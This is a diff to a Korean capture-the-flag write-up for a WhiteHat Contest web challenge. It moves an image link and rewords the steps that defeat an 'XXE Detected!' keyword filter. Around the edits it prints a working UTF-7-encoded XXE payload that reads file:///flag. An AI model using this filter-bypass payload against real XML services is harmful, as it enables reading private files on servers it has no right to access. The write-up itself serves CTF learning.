@@ -130,9 +130,10 @@ http://cd4303efc81f21c1d1e15f4a38ac4636.whitehatcontest.kr/?page=ZG85ZGFya0Bkbzk
 ![nc_response_xxe](img/012.png)  
 하지만, `XXE Detected!` 메시지가 발생하면서 실패한 것을 볼 수 있습니다.
 
-![nc_xxe_utf7](img/013.png)  
 몇 가지 테스트를 해보면 `DOCTYPE`, `ENTITY`, `SYSTEM`과 같은 문자열이 있을 경우 XXE 공격을 막아놓은 것을 알 수 있습니다.  
-이 부분은 UTF-7을 통해서 우회할 수 있습니다.  
+이 부분은 UTF-7을 통해서 우회할 수 있습니다.
+
+![nc_xxe_utf7](img/013.png)  
 ```xml
 <?xml version="1.0" encoding="UTF-7"?>
 <+ACE-+AEQ-+AE8-+AEM-+AFQ-+AFk-+AFA-+AEU- foo +AFs-+ADw-+ACE-+AEU-+AE4-+AFQ-+AEk-+AFQ-+AFk- flag +AFM-+AFk-+AFM-+AFQ-+AEU-+AE0- "file:///flag" +AD4-+AF0->
@@ -143,7 +144,7 @@ http://cd4303efc81f21c1d1e15f4a38ac4636.whitehatcontest.kr/?page=ZG85ZGFya0Bkbzk
 ```
 
 ![flag](img/014.png)  
-UTF-7로 변환한 XXE 공격이 성공하여 `/flag` 파일의 내용을 정상적으로 확인할 수 있습니다.
+UTF-7 변환을 통하여 `XXE Detected!`를 우회하고 `/flag` 파일의 내용을 정상적으로 확인할 수 있습니다.
 
 ![iconv](img/015.png)  
 다음과 같은 명령어를 통해 UTF-7로 변환한 문자열을 UTF-8로 변환하여 확인할 수 있습니다.  
